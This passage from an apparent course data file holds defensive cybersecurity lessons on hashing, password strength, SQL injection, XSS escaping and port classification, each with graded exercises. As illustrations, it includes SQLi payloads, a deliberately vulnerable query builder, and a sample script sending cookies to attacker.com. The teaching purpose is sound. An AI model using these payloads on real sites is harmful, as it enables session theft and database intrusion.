^salt_and_hash(password: str, salt: str) -> str^: Returns a string formatted as ^salt + \"$\" + computed_hash^ where ^computed_hash^ is the SHA-256 hex digest of ^salt + password^.\n2. ^verify_password(stored_record: str, candidate_password: str) -> bool^:\n   - Splits ^stored_record^ on the ^$^ delimiter into ^salt^ and ^expected_hash^.\n   - Computes the SHA-256 hash of ^salt + candidate_password^.\n   - Returns ^True^ if they match, ^False^ otherwise.","starter":"import hashlib\n\ndef salt_and_hash(password: str, salt: str) -> str:\n    # TODO: Return salt + \"$\" + sha256(salt + password)\n    return \"\"\n\ndef verify_password(stored_record: str, candidate_password: str) -> bool:\n    # TODO: Split stored_record into salt and hash, verify candidate_password\n    return False\n","hint":"Combine salt + password into a UTF-8 encoded byte string, hash with sha256, and join with a dollar sign: salt + \"$\" + h.","terms":[{"term":"salt","def":"A unique, random string added to a password before hashing to ensure identical passwords produce distinct hashes."},{"term":"Rainbow Table","def":"A pre-computed lookup table of common passwords and their cryptographic hashes used by attackers to crack passwords rapidly."},{"term":"credential cracking","def":"The process of recovering original passwords from stolen cryptographic hashes."},{"term":"key stretching","def":"Running hash algorithms through thousands of iterations (like PBKDF2, bcrypt, or Argon2) to slow down brute-force attackers."}],"image":{"url":"/diagrams/cybersecurity/salting-passwords.svg","caption":"A random salt added to each password ensures identical passwords generate completely different hashes, neutralizing pre-computed Rainbow Tables."},"isUnitTest":false,"fileName":"security.py","tests":[{"name":"Create Salted Password Record","input":"hash\nSuperSecretPass!\nrandom_salt_99\n","expected":"random_salt_99$1ed19d126b05e083adcf538ba666d1dc759d95b79ec4efc742f7e96c356c4c8b"},{"name":"Verify Correct Login Password","input":"verify\nrandom_salt_99$1ed19d126b05e083adcf538ba666d1dc759d95b79ec4efc742f7e96c356c4c8b\nSuperSecretPass!\n","expected":"True"},{"name":"Reject Wrong Login Password","input":"verify\nrandom_salt_99$1ed19d126b05e083adcf538ba666d1dc759d95b79ec4efc742f7e96c356c4c8b\nWrongGuess123\n","expected":"False"}],"usesInput":true,"hasHarness":true},{"id":"password-strength","number":"2.3","title":"Password Entropy & Dictionary Attack Defense","content":"## The \"Tr0ub4dor&3\" Fallacy\n\nFor twenty years, websites forced users to create passwords that follow annoying rules: *\"Must include 8 characters, at least 1 uppercase letter, 1 number, and 1 special symbol.\"*\n\nWhat do humans actually do when presented with these rules? They pick an ordinary word, capitalize the first letter, replace 'o' with '0', and slap an exclamation mark on the end: ^\"Password1!\"^ or ^\"Tr0ub4dor&3\"^.\n\nAttackers know this human habit! Cracking tools like John the Ripper and Hashcat include rules that test these exact substitutions automatically. A password like ^\"P@ssw0rd1!\"^ can be cracked in less than four seconds.\n\n## Entropy: Length Beats Complexity\n\nIn cybersecurity and information theory, **entropy** measures randomness and unpredictability.\nConsider two passwords:\n1. ^\"Tr0ub4dor&3\"^ (11 characters): hard for a human to memorize, cracked by an automated GPU in ~3 days.\n2. ^\"correct horse battery staple\"^ (28 characters): four random common words picked from a dictionary. Extremely easy for a human to visualize, but requires an attacker to guess across a keyspace that would take **trillions of centuries** to exhaust!\n\nLength is the single most powerful factor in password defense.\n\n## Pop Culture: Spaceballs Luggage Combination\n\nIn Mel Brooks' sci-fi parody *Spaceballs*, Lord Dark Helmet and Colonel Sandurz force King Roland to reveal the secret combination to the planet's atmospheric shield. The combination? **1-2-3-4-5**. \n\nPresident Skroob exclaims: *\"1-2-3-4-5?! That's the kind of thing an idiot would have on his luggage!\"* followed by *\"That's the combination on my luggage!\"*\n\nThe comedy reflects reality: every year, cybersecurity audits reveal that millions of users protect their bank accounts with passwords like ^\"123456\"^, ^\"password\"^, and ^\"qwerty\"^.\n\n## Code Walkthrough\n\nWe use regular expressions (^re^) to test diversity and check against a blacklist of common dictionary words:\n\n~~~\nimport re\n\nCOMMON_BLACKLIST = [\"password\", \"admin\", \"welcome\", \"123456\", \"qwerty\", \"letmein\", \"dragon\"]\n\ndef contains_dictionary_word(pwd: str) -> bool:\n    lower_pwd = pwd.lower()\n    return any(word in lower_pwd for word in COMMON_BLACKLIST)\n~~~\n\n## Predict & Observe\n\nWhy is ^\"correct horse battery staple\"^ strong if it is made of dictionary words?\nBecause the words are chosen independently at random. An attacker cannot guess the sequence without testing combinations of words, and $2048^4 \\approx 1.7 \\times 10^{13}$ combinations!\n\n## Your Task\n\nImplement ^assess_password(password: str) -> dict^ in ^security.py^.\nIt must:\n1. Check if any word from ^[\"password\", \"admin\", \"welcome\", \"123456\", \"qwerty\", \"letmein\", \"dragon\"]^ appears as a substring in ^password.lower()^. If found, return:\n   ^{ \"rating\": \"COMPROMISED\", \"score\": 0, \"reason\": \"Dictionary word detected\" }^\n2. Otherwise, calculate an integer score based on these criteria:\n   - Length >= 10: +1 point\n   - Length >= 16: +1 point\n   - Contains lowercase letter (^re.search(r'[a-z]', password)^): +1 point\n   - Contains uppercase letter (^re.search(r'[A-Z]', password)^): +1 point\n   - Contains digit (^re.search(r'\\d', password)^): +1 point\n   - Contains symbol/punctuation (^re.search(r'[^A-Za-z0-9]', password)^): +1 point\n3. Determine rating:\n   - Score < 3: ^\"WEAK\"^\n   - Score in [3, 4]: ^\"MEDIUM\"^\n   - Score >= 5: ^\"STRONG\"^\n4. Return: ^{ \"rating\": rating, \"score\": score }^","starter":"import re\n\nCOMMON_BLACKLIST = [\"password\", \"admin\", \"welcome\", \"123456\", \"qwerty\", \"letmein\", \"dragon\"]\n\ndef assess_password(password: str) -> dict:\n    # TODO: Check dictionary blacklist, calculate criteria score, return dict\n    return {\"rating\": \"WEAK\", \"score\": 0}\n","hint":"Check if any word in COMMON_BLACKLIST is in password.lower(). If not, add up points for length, lower, upper, digit, and symbol.","terms":[{"term":"entropy","def":"A measure of randomness and unpredictability in information. Higher entropy means a password is mathematically harder to guess."},{"term":"dictionary attack","def":"A brute-force attack that tries words from a pre-compiled wordlist rather than random character combinations."},{"term":"passphrase","def":"A sequence of several random words used as a password, offering high entropy and high human memorability."},{"term":"character space","def":"The pool of possible characters (lowercase, uppercase, digits, symbols) used to construct a secret."}],"image":{"url":"/diagrams/cybersecurity/password-strength.svg","caption":"XKCD 936: Long passphrases provide far greater mathematical entropy than short passwords with predictable symbol substitutions."},"isUnitTest":false,"fileName":"security.py","tests":[{"name":"Compromised Dictionary Password","input":"MyDragonPassword2026!\n","expected":"Rating: COMPROMISED | Score: 0"},{"name":"Weak Short Password","input":"abc12\n","expected":"Rating: WEAK | Score: 2"},{"name":"Medium Password","input":"Falcon9Rocket\n","expected":"Rating: MEDIUM | Score: 4"},{"name":"Strong High-Entropy Passphrase","input":"Galaxy-nebula-voyager-quantum-42!\n","expected":"Rating: STRONG | Score: 6"}],"usesInput":true,"hasHarness":true},{"id":"unit-2-test","number":"2.4","title":"Unit 2 Test: Bank Vault Authentication & Salted Password Verifier","content":"## The Iron Bank of Braavos Vault Security\n\nThe Iron Bank of Braavos controls the treasury of kingdoms. Its legendary subterranean vaults are protected by titanium doors and heavy stone locks. But the bank is upgrading its authentication system to defend against modern cyber adversaries.\n\nYou have been recruited as the Chief Security Architect. Your mission: build the ^BankVaultAuth^ credential management class.\n\n## Security Engineering Specifications\n\n1. **Password Policy Enforcement**:\n   To prevent account takeovers, passwords must satisfy strict complexity:\n   - Length $\\ge 10$ characters\n   - At least 1 uppercase letter (^re.search(r'[A-Z]', password)^)\n   - At least 1 lowercase letter (^re.search(r'[a-z]', password)^)\n   - At least 1 digit (^re.search(r'\\d', password)^)\n   - At least 1 special character (^re.search(r'[^A-Za-z0-9]', password)^)\n   If any requirement fails, registration must be rejected.\n\n2. **Per-User Cryptographic Salt**:\n   When registering an account, generate a unique salt:\n   ^salt = hashlib.sha256((username + \"_vault_salt\").encode('utf-8')).hexdigest()[:16]^\n   Hash the salt + password with SHA-256 and store in the internal database dictionary as ^salt + \"$\" + hashed_password^.\n\n3. **Protection Against User Enumeration**:\n   When logging in, if the username does not exist OR if the password is incorrect, return the exact same generic error:\n   ^(False, \"Invalid username or password\")^\n   Never say \"User does not exist\", as this leaks whether an account exists to attackers!\n\n## Your Task\n\nImplement the class ^BankVaultAuth^ in ^security.py^ with:\n- ^__init__()^: initializes ^self.db = {}^\n- ^register(username: str, password: str) -> tuple[bool, str]^:\n  - If username already exists, return ^(False, \"Username already registered\")^.\n  - If password fails complexity, return ^(False, \"Password does not meet complexity requirements\")^.\n  - Otherwise, store salted hash and return ^(True, \"User registered successfully\")^.\n- ^login(username: str, password: str) -> tuple[bool, str]^:\n  - If valid, return ^(True, f\"Welcome to Vault, {username}!\")^.\n  - If invalid, return ^(False, \"Invalid username or password\")^.","starter":"import hashlib, re\n\nclass BankVaultAuth:\n    def __init__(self):\n        # TODO: Initialize database store\n        self.db = {}\n\n    def register(self, username: str, password: str) -> tuple[bool, str]:\n        # TODO: Validate policy, generate salt, store salted hash\n        return False, \"\"\n\n    def login(self, username: str, password: str) -> tuple[bool, str]:\n        # TODO: Verify credentials without leaking username existence\n        return False, \"\"\n","hint":"Remember to check len >= 10, uppercase, lowercase, digit, and symbol. Return (False, \"Invalid username or password\") for both wrong password and missing user.","terms":[{"term":"user enumeration","def":"A vulnerability where differing error messages (e.g., \"User not found\" vs \"Wrong password\") reveal which usernames exist in a system."},{"term":"credential database","def":"A secure datastore holding user identities and their salted cryptographic password hashes."}],"image":{"url":"/diagrams/cybersecurity/unit-2-test.svg","caption":"The Iron Bank of Braavos authentication lifecycle: strict password entropy check, cryptographic salt generation, and safe verification."},"isUnitTest":true,"fileName":"security.py","tests":[{"name":"Full Vault Credential Flow","input":"register|braavos_treasurer|WeakPass\nregister|braavos_treasurer|IronBank2026!Gold\nregister|braavos_treasurer|IronBank2026!Gold\nlogin|braavos_treasurer|WrongGuess123!\nlogin|braavos_treasurer|IronBank2026!Gold\nlogin|unknown_intruder|AnyPassword123!\n","expected":"REG: False | Password does not meet complexity requirements\nREG: True | User registered successfully\nREG: False | Username already registered\nLOG: False | Invalid username or password\nLOG: True | Welcome to Vault, braavos_treasurer!\nLOG: False | Invalid username or password"}],"usesInput":true,"hasHarness":true}]},{"id":"web-security","title":"Web Security & Injection Defense","lessons":[{"id":"sql-injection-intro","number":"3.1","title":"SQL Injection (SQLi) & Dangerous Concatenation","content":"## The Little Bobby Tables Fable\n\nImagine a bank check where you fill in the payee line: *\"Pay to the order of: ________\"*. \nInstead of writing a normal name, a trickster writes:\n*\"Alice; TRANSFER ALL VAULT FUNDS TO ACCOUNT 999999; --\"*\n\nIf the bank teller is foolish enough to read that payee line as a command to be executed rather than as inert text, the entire bank is wiped out! \n\nThis is the exact mechanism of **SQL Injection (SQLi)**. When a web application glues user-submitted text directly into an SQL query using string formatting or string concatenation (like ^f\"SELECT * FROM users WHERE name = '{user_input}'\"^), an attacker can type quote marks and SQL commands that hijack the database engine.\n\n## Breaking the Parser Syntax\n\nSuppose a login endpoint executes:\n~~~\nquery = \"SELECT * FROM users WHERE user = '\" + input_username + \"' AND pass = '\" + input_password + \"'\"\n~~~\n\nIf an attacker enters the username:\n~~~\n' OR '1'='1\n~~~\n\nThe resulting query becomes:\n~~~\nSELECT * FROM users WHERE user = '' OR '1'='1' AND pass = '...'\n~~~\n\nBecause ^'1'='1'^ is mathematically **always TRUE**, the SQL query matches every single user in the database! The application logs the attacker in as the first user in the table—which is almost always the administrator.\n\n## Pop Culture: XKCD 327 (Exploits of a Mom)\n\nIn Randall Munroe's famous *XKCD* comic #327:\nA school calls a mother: *\"Did you really name your son Robert'); DROP TABLE Students;-- ?\"*\nThe mother replies: *\"Oh, yes. Little Bobby Tables, we call him. I hope you've learned to sanitize your database inputs.\"*\n\nThe single quote closed the student's name string, the semicolon ended the statement, ^DROP TABLE Students;^ deleted all school records, and the double-dash ^--^ commented out the rest of the school's query.\n\n## Detecting Injection Signatures\n\nDefenders write inspection engines to spot known SQL injection attack patterns:\n- Boolean tautologies: ^' OR '1'='1^ or ^' OR 1=1^\n- Database comments: ^--^ or ^/*^\n- Multi-query chained execution: ^;^ followed by statements\n- Data exfiltration commands: ^UNION SELECT^\n- Destructive commands: ^DROP TABLE^\n\n## Your Task\n\nImplement two functions in ^security.py^:\n1. ^build_vulnerable_query(username: str) -> str^: Returns the string:\n   ^f\"SELECT * FROM users WHERE username = '{username}' AND status = 'active'\"^\n2. ^detect_sqli(user_input: str) -> bool^:\n   Returns ^True^ if ^user_input^ contains any of the following patterns (case-insensitive):\n   - ^' OR '1'='1^ or ^' OR 1=1^\n   - ^UNION SELECT^\n   - ^DROP TABLE^\n   - ^--^ (SQL comment)\n   - ^;^ (statement terminator)\n   Otherwise returns ^False^.","starter":"def build_vulnerable_query(username: str) -> str:\n    # TODO: Concatenate username into SQL query string\n    return \"\"\n\ndef detect_sqli(user_input: str) -> bool:\n    # TODO: Check for SQL injection patterns\n    return False\n","hint":"Use re.search with re.IGNORECASE to look for patterns like UNION SELECT, DROP TABLE, --, and ;.","terms":[{"term":"SQL Injection (SQLi)","def":"A vulnerability where malicious user input alters the structure of backend SQL queries."},{"term":"string concatenation","def":"Combining text strings with the + operator or f-strings. Extremely dangerous when building database queries."},{"term":"tautology","def":"A statement that is always true, such as \"1=1\" or \"true\", used in SQLi to bypass authentication checks."},{"term":"sanitization","def":"Cleaning or validating untrusted user input before processing it to remove dangerous control characters."}],"image":{"url":"/diagrams/cybersecurity/sql-injection-intro.svg","caption":"SQL Injection: User input breaks out of string delimiters and changes the boolean logic of the query parser."},"isUnitTest":false,"fileName":"security.py","tests":[{"name":"Inspect Benign and Malicious Inputs","input":"alice_smith\nadmin' OR '1'='1\njohn; DROP TABLE users; --\nnormal_query\n","expected":"Input: alice_smith | SQLi: False\nInput: admin' OR '1'='1 | SQLi: True\nInput: john; DROP TABLE users; -- | SQLi: True\nInput: normal_query | SQLi: False"}],"usesInput":true,"hasHarness":true},{"id":"sql-sanitization","number":"3.2","title":"Prepared Statements & Parameterized Queries","content":"## The Pneumatic Tube Capsule\n\nThink of the drive-through tube at a bank. You place your cash into a heavy, clear plastic cylinder. You press a button, and the cylinder travels through the pneumatic pipe to the teller inside. \n\nBecause the money is sealed inside the capsule, the money cannot touch the pipe valves, cannot flip electrical switches, and cannot pull the fire alarm. \n\n**Parameterized queries** (also known as **prepared statements**) are that plastic capsule:\n1. The application sends the SQL query template to the database *first*:\n   ^SELECT * FROM accounts WHERE username = ? AND pin = ?^\n2. The database parses and compiles the query structure into an Abstract Syntax Tree (AST). It knows exactly what is a command and what is a data slot.\n3. The application sends the user's input in a separate parameter tuple: ^(\"admin' OR '1'='1\", \"secret\")^.\n4. The database places that parameter strictly into the username data slot. It searches for an account whose literal name is the 15 characters ^\"admin' OR '1'='1\"^.\n\nEven if an attacker types malicious SQL syntax, the database treats it as harmless, inert text. The SQL injection is completely neutralized!\n\n## Pop Culture: The Matrix Spoon\n\nIn *The Matrix*, the young prodigy hands Neo a bent metal spoon and tells him: *\"Do not try and bend the spoon—that's impossible. Instead, only try to realize the truth: there is no spoon.\"*\n\nIn secure software engineering: *\"There is no executable code in user input—there is only data.\"* Parameterized queries guarantee that no user input can ever be transformed into executable database commands.\n\n## Code Walkthrough\n\nPython's built-in ^sqlite3^ library makes parameterization effortless using the ^?^ placeholder:\n\n~~~\nimport sqlite3\n\nconn = sqlite3.connect(':memory:')\ncursor = conn.cursor()\ncursor.execute(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, role TEXT)\")\n\n# Inserting safe test data:\ncursor.execute(\"INSERT INTO users (username, role) VALUES (?, ?)\", (\"alice\", \"admin\"))\n\n# SAFE PARAMETERIZED LOOKUP:\npayload = \"alice' OR '1'='1\"\ncursor.execute(\"SELECT username, role FROM users WHERE username = ?\", (payload,))\nresults = cursor.fetchall() # Returns empty list [] ! Safe!\n~~~\n\n## Predict & Observe\n\nWhat happens if you use ^f\"SELECT * FROM users WHERE username = '{payload}'\"^ instead of ^?^?\nThe query returns Alice and every other record in the table! Never use f-strings or format strings to construct SQL queries.\n\n## Your Task\n\nImplement ^safe_user_lookup(conn, username: str) -> list[tuple]^ in ^security.py^.\nIt must:\n1. Execute a parameterized query using ^cursor.execute(...)^ with a ^?^ placeholder:\n   ^\"SELECT username, role FROM users WHERE username = ?\"^\n2. Pass ^(username,)^ as the parameter tuple.\n3. Return the fetched list of rows with ^cursor.fetchall()^.","starter":"import sqlite3\n\ndef safe_user_lookup(conn, username: str) -> list[tuple]:\n    # TODO: Execute parameterized query with ? placeholder and return fetchall()\n    return []\n","hint":"Use cursor.execute(\"SELECT username, role FROM users WHERE username = ?\", (username,)) and return cursor.fetchall().","terms":[{"term":"prepared statement","def":"A pre-compiled database query where the structure is defined beforehand and user input is bound to parameters."},{"term":"parameter binding","def":"Supplying user input as separate values to a query placeholder, preventing the input from altering the SQL syntax."},{"term":"SQL placeholder","def":"A symbol (such as ? in SQLite or %s in PostgreSQL) marking where a parameter value will be inserted."}],"image":{"url":"/diagrams/cybersecurity/sql-sanitization.svg","caption":"Prepared statements compile the SQL command structure first. User input is supplied as inert parameters that can never be executed as code."},"isUnitTest":false,"fileName":"security.py","tests":[{"name":"Parameterized Query Safe Execution","input":"alice\nalice' OR '1'='1\nbob\n","expected":"Lookup 'alice': [('alice', 'admin')]\nLookup 'alice' OR '1'='1': []\nLookup 'bob': [('bob', 'operator')]"}],"usesInput":true,"hasHarness":true},{"id":"xss-defense","number":"3.3","title":"Cross-Site Scripting (XSS) & HTML Escaping","content":"## The Hallway Bulletin Board\n\nImagine a public corkboard in a community center where anyone can pin up a flyer. You post a notice offering guitar lessons. But a prankster pins up a note written with glowing dust: *\"Whoever reads this note, hand your house keys to the stranger by the door.\"*\n\nWhen innocent visitors read the board, they are compelled to obey the command. \n\nThat is **Cross-Site Scripting (XSS)**. On the web, browsers are built to execute JavaScript found inside HTML. If a blog allows users to post comments and prints those comments directly into the webpage without sanitization:\n\n~~~\n<p>User comment: <script>fetch(\"https://attacker.com/steal?cookie=\" + document.cookie)</script></p>\n~~~\n\nEvery single visitor's browser executes that script! The script can steal session cookies, hijack bank sessions, log keystrokes, and impersonate the victim.\n\n## The Defense: HTML Entity Escaping\n\nTo stop XSS, web servers must **escape** special HTML characters before rendering them. We replace characters that have special meaning to the browser with **HTML entities**:\n- ^&^ becomes ^&amp;^\n- ^<^ becomes ^&lt;^ (Less-than sign)\n- ^>^ becomes ^&gt;^ (Greater-than sign)\n- ^\"^ becomes ^&quot;^ (Double quote)\n- ^'^ becomes ^&#x27;^ (Single quote)\n\nWhen the browser encounters ^&lt;script&gt;^, it does **not** execute it as code. Instead, it draws the literal characters ^<script>^ on the screen as harmless visual text!\n\n## Pop Culture: The Samy MySpace Worm (2005)\n\nIn October 2005, a 19-year-old hacker named Samy Kamkar placed a small piece of JavaScript inside his MySpace profile bio. Whenever another user viewed his profile, the script ran silently in their browser:\n1. It added Samy as their hero: *\"Samy is my hero.\"*\n2. It copied the malicious script onto the victim's own profile!\n\nWithin **20 hours**, the worm had infected over **1,000,000 users**, forcing MySpace to take their entire site offline. It remains one of the fastest-spreading computer worms in history—all powered by a single unescaped XSS flaw.\n\n## Code Walkthrough\n\nWe must escape the ampersand ^&^ first, so our subsequent replacements aren't double-escaped:\n\n~~~\ndef escape_html(s: str) -> str:\n    return (s.replace(\"&\", \"&amp;\")\n             .replace(\"<\", \"&lt;\")\n             .replace(\">\", \"&gt;\")\n             .replace('\"', \"&quot;\")\n             .replace(\"'\", \"&#x27;\"))\n~~~\n\n## Predict & Observe\n\nWhat happens if you replace ^<^ before replacing ^&^?\nIf you convert ^<^ to ^&lt;^ first, and then replace ^&^ with ^&amp;^, your entity becomes ^&amp;lt;^, which displays as ugly broken text on the user's screen! Always escape ^&^ first.\n\n## Your Task\n\nImplement two functions in ^security.py^:\n1. ^escape_html_entities(text: str) -> str^: Replaces ^&^, ^<^, ^>^, ^\"^, and ^'^ with their respective HTML entities in the correct order.\n2. ^sanitize_comment(author: str, comment: str) -> dict^:\n   - Returns a dictionary:\n     ^{ \"author\": escaped_author, \"comment\": escaped_comment, \"xss_threat\": bool }^\n   - Sets ^\"xss_threat\": True^ if the original comment contained ^<script^, ^javascript:^, or ^onerror=^ (case-insensitive); otherwise ^False^.","starter":"def escape_html_entities(text: str) -> str:\n    # TODO: Escape &, <, >, \", and ' in the correct order\n    return \"\"\n\ndef sanitize_comment(author: str, comment: str) -> dict:\n    # TODO: Escape both fields and check if XSS threats were present\n    return {}\n","hint":"Escape & first, then <, >, \", and '. Use re.search for <script|javascript:|onerror= to flag threats.","terms":[{"term":"Cross-Site Scripting (XSS)","def":"A security vulnerability where attackers inject malicious scripts into trusted websites viewed by other users."},{"term":"HTML entity escaping","def":"Replacing special HTML characters (&, <, >, \", ') with their safe entity representations so browsers display them as text rather than code."},{"term":"session hijacking","def":"An attack where a threat actor steals a user’s authentication cookie or session token to impersonate them."},{"term":"Stored XSS","def":"XSS where the malicious payload is permanently stored in a database (e.g. in comments) and served to every visitor."}],"image":{"url":"/diagrams/cybersecurity/xss-defense.svg","caption":"Cross-Site Scripting (XSS): HTML entity escaping converts dangerous tags into harmless visual characters (&lt; and &gt;)."},"isUnitTest":false,"fileName":"security.py","tests":[{"name":"Sanitize Benign and Malicious Comments","input":"Alice|Rock & Roll! <3\nAttacker|<script>steal()</script>\nBob|Check <img src=x onerror=alert(1)> out\n","expected":"Author: Alice | Comment: Rock &amp; Roll! &lt;3 | Threat: False\nAuthor: Attacker | Comment: &lt;script&gt;steal()&lt;/script&gt; | Threat: True\nAuthor: Bob | Comment: Check &lt;img src=x onerror=alert(1)&gt; out | Threat: True"}],"usesInput":true,"hasHarness":true},{"id":"unit-3-test","number":"3.4","title":"Unit 3 Test: E-Commerce Web Form Sanitization Firewall","content":"## MegaStore Cyber Monday Defense Shield\n\nThe holiday shopping season has arrived. MegaStore's checkout API is receiving thousands of transactions per minute. However, malicious botnets are attempting to exploit the system:\n1. Attackers are injecting SQL payloads into search queries to dump database tables.\n2. Attackers are embedding JavaScript in review boxes to steal shopper credentials.\n3. Attackers are submitting negative or absurd quantities (like -5 or 999999 items) to manipulate inventory accounting.\n\nYou are tasked with implementing the core ^WebDefenseFirewall^ class to protect the checkout pipeline!\n\n## Firewall Inspection Rules\n\n1. **SQL Injection Filter**:\n   Inspect ^username^ and ^search_term^. If either field matches any SQLi signature (^' OR '1'='1^, ^' OR 1=1^, ^UNION SELECT^, ^DROP TABLE^, ^--^, ^;^):\n   - Return: ^{ \"status\": \"BLOCKED\", \"reason\": \"SQL_INJECTION_DETECTED\", \"field\": field_name }^\n\n2. **Numeric Boundary Validation**:\n   Inspect ^quantity^. It must be an integer between 1 and 99 inclusive:\n   - If invalid: Return ^{ \"status\": \"BLOCKED\", \"reason\": \"INVALID_QUANTITY\", \"value\": quantity }^\n\n3. **HTML Sanitization & XSS Defense**:\n   Escape all HTML entities (^&^, ^<^, ^>^, ^\"^, ^'^) in ^username^, ^search_term^, and ^review_text^.\n   If ^review_text^ contained an XSS attack vector (^<script^, ^javascript:^, ^onerror=^), add ^\"XSS_DEFUSED\"^ to the ^threats^ list.\n\n4. **Approval**:\n   If all validation checks pass:\n   - Return: ^{ \"status\": \"APPROVED\", \"sanitized\": { ... }, \"threats\": threats }^\n\n## Your Task\n\nImplement ^class WebDefenseFirewall^ with method ^process_order(order: dict) -> dict^ in ^security.py^.","starter":"class WebDefenseFirewall:\n    def process_order(self, order: dict) -> dict:\n        # TODO: Implement SQLi inspection, quantity validation, and HTML escaping\n        return {\"status\": \"BLOCKED\"}\n","hint":"Inspect username and search_term for SQL injection patterns. Check 1 <= quantity <= 99. Escape all strings.","terms":[{"term":"Web Application Firewall (WAF)","def":"A security system that monitors, filters, and blocks HTTP traffic to and from a web application."},{"term":"input validation","def":"Verifying that data conforms to expected formats, types, and ranges before processing."}],"image":{"url":"/diagrams/cybersecurity/unit-3-test.svg","caption":"The Web Form Defense Firewall inspects queries for SQLi, escapes HTML for XSS mitigation, and enforces strict numeric constraints."},"isUnitTest":true,"fileName":"security.py","tests":[{"name":"Multi-Vector Web Firewall Suite","input":"","expected":"Status: APPROVED | Reason/Threats: []\nStatus: BLOCKED | Reason/Threats: SQL_INJECTION_DETECTED\nStatus: APPROVED | Reason/Threats: ['XSS_DEFUSED']\nStatus: BLOCKED | Reason/Threats: INVALID_QUANTITY"}],"usesInput":false,"hasHarness":true}]},{"id":"network-security","title":"Network Security & Traffic Analysis","lessons":[{"id":"ip-port-basics","number":"4.1","title":"IP Addresses, Ports & Network Services","content":"## The Airport Gate & Apartment Analogy\n\nThink of an **IP Address** (Internet Protocol) like the street address of a large international airport terminal. When an airplane flies toward the airport, air traffic control routes it to that specific GPS destination.\n\nOnce the airplane lands at the terminal, where do the passengers get off? They dock at a numbered gate! \n- **Gate 80**: The open public lobby (HTTP cleartext web).\n- **Gate 443**: The secure international customs checkpoint (HTTPS encrypted web).\n- **Gate 22**: The locked maintenance door for pilots and mechanics (SSH remote shell).\n- **Gate 53**: The airport directory and timetable board (DNS domain lookup).\n\nThese numbered gates are **Ports**! While an IP address routes traffic to the correct computer, the port number routes traffic to the specific software program running on that computer.\n\n## Private vs. Public IP Addresses\n\nCertain IP address ranges are reserved for internal home or corporate Local Area Networks (LANs). These addresses are never routed directly over the public internet:\n- ^127.0.0.1^: Localhost (your own machine)\n- ^10.0.0.0^ - ^10.255.255.255^: Class A Private LAN\n- ^172.16.0.0^ - ^172.31.255.255^: Class B Private LAN\n- ^192.168.0.0^ - ^192.168.255.255^: Class C Private LAN (most home Wi-Fi routers)\n\nAny IP outside these ranges is a **Public IP**.\n\n## Port Classification & Security Risk\n\nPort numbers range from 0 to 65,535:\n- **0 - 1,023**: Well-Known Ports (assigned to standard protocols like HTTP, SSH, FTP).\n- **1,024 - 49,151**: Registered Ports (used by database servers and custom applications).\n- **49,152 - 65,535**: Dynamic / Ephemeral Ports (temporary client ports).\n\nLeaving cleartext services (like FTP on port 21 or HTTP on port 80) open on a public IP allows attackers to sniff passwords in transit. Leaving a database port (like MySQL on port 3306) directly accessible to the public internet is a critical security vulnerability.\n\n## Pop Culture: WarGames & Wardialing\n\nIn the 1983 cybersecurity movie *WarGames*, high school hacker David Lightman (Matthew Broderick) programs his computer modem to dial every phone number in Sunnyvale, California looking for computer carrier tones. He stumbles upon a military supercomputer named WOPR. \n\nToday, attackers don't dial phone numbers; they scan IP addresses and port numbers looking for forgotten, open doors.\n\n## Your Task\n\nImplement ^classify_endpoint(ip: str, port: int) -> dict^ in ^security.py^:\n1. Determine if IP is ^\"Private\"^ or ^\"Public\"^:\n   - Private if it starts with ^\"127.\"^, ^\"10.\"^, ^\"192.168.\"^, or ^\"172.16.\"^ through ^\"172.31.\"^.\n   - Otherwise ^\"Public\"^.\n2. Determine the service name:\n   - 21: ^\"FTP\"^\n   - 22: ^\"SSH\"^\n   - 53: ^\"DNS\"^\n   - 80: ^\"HTTP\"^\n   - 443: ^\"HTTPS\"^\n   - 3306: ^\"MySQL\"^\n   - Otherwise: ^\"Unknown\"^\n3. Determine risk level:\n   - If port 3306 on a Public IP: ^\"CRITICAL_DATABASE_EXPOSED\"^\n   - If port in (21, 80) on a Public IP: ^\"HIGH_RISK_CLEARTEXT\"^\n   - If port in (22, 443): ^\"SECURE_ENCRYPTED\"^\n   - Otherwise: ^\"STANDARD\"^\n4. Return: ^{ \"network\": network, \"service\": service, \"risk\": risk }^","starter":"def classify_endpoint(ip: str, port: int) -> dict:\n    # TODO: Determine network type (Private/Public), service, and risk level\n    return {}\n","hint":"Check if IP starts with 192.168., 10., or 127. Classify port 3306 as MySQL, 80 as HTTP, 443 as HTTPS.","terms":[{"term":"IP address","def":"A unique numerical identifier assigned to each device connected to a computer network."},{"term":"port","def":"A 16-bit number (0-65535) identifying a specific network service or application on a host."},{"term":"private IP","def":"An IP address reserved for internal networks (e.g. 192.168.x.x, 10.x.x.x) not routable on the public internet."},{"term":"cleartext protocol","def":"A communication protocol (like HTTP or FTP) that transmits data without encryption, visible to anyone eavesdropping."}],"image":{"url":"/diagrams/cybersecurity/ip-port-basics.svg","caption":"An IP address identifies the host building. Port numbers identify specific entrance doors for services (Port 22 SSH, Port 80 HTTP, Port 443 HTTPS)."},"isUnitTest":false,"fileName":"security.py","tests":[{"name":"Network Endpoint Classification Suite","input":"","expected":"192.168.1.1:443 -> Network: Private | Service: HTTPS | Risk: SECURE_ENCRYPTED\n93.184.216.34:80 -> Network: Public | Service: HTTP | Risk: HIGH_RISK_CLEARTEXT\n198.51.100.22:3306 -> Network: Public | Service: MySQL | Risk: CRITICAL_DATABASE_EXPOSED\n10.0.0.5:22 -> Network: Private | Service: SSH | Risk: SECURE_ENCRYPTED"}],"usesInput":false,"hasHarness":true},{"id":"packet-inspection","number":"4.2","title":"Packet Header Parsing & Port Scan Detection","content":"## The Hotel Doorknob Burglar\n\nImagine a hotel corridor at 3:00 AM. A normal guest steps out of the elevator, walks directly to room 304, inserts their keycard, and enters.\n\nNow imagine a suspicious figure walking down the hallway. They jiggle the doorknob of room 301. Locked. They jiggle room 302. Locked. Room 303. Locked. Room 304. Locked. \n\nThat suspicious behavior is a **port scan** (executed using tools like Nmap). The attacker sends probe packets to dozens of ports on a target server to discover which doors are unlocked.\n\n## The Anatomy of an IP Packet Header\n\nEvery network packet traveling across the internet includes header metadata:\n- **Source IP**: The address of the sender.\n- **Destination IP**: The address of the recipient.\n- **Destination Port**: The application port targeted on the recipient.\n- **Protocol**: TCP (Transmission Control Protocol) or UDP (User Datagram Protocol).\n- **Flags**: TCP connection state flags, such as **SYN** (Synchronize / request connection).\n\nA security analyst inspecting network telemetry groups connection attempts by source IP. If one source IP attempts connections to more than a threshold number of unique ports, the system flags a **Port Scan Alert**.\n\n## Pop Culture: The Matrix Reloaded 